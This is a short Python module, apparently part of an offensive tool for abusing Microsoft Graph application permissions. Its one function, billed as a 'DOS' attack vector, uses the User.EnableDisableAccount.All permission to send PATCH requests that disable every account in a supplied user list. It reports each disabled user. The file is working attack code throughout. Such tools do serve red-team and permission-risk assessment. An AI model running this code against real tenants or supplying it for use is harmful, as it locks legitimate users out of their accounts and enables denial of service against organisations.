import requests
import colorama
from colorama import Fore, Style


def UserEnDis_Vectors(request_headers, UserEnDisSettings):
    print()
    print(
        "User.EnableDisableAccount.All - Allows the app to enable and disable users' accounts, without a signed-in "
        "user..")
    print()
    try:
        print("Attack vector - DOS.")

        for user in UserEnDisSettings['users']:
            create_message_URL = "https://graph.microsoft.com/v1.0/users/" + user
            message_obj = {
                "accountEnabled": "false"
            }

            result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)
            code = result.status_code

            if code == 204:
                print(Fore.GREEN + "Disabled user " + user)
                print(Style.RESET_ALL)
            else:
                print("Action did not worked.")


    except:
        pass
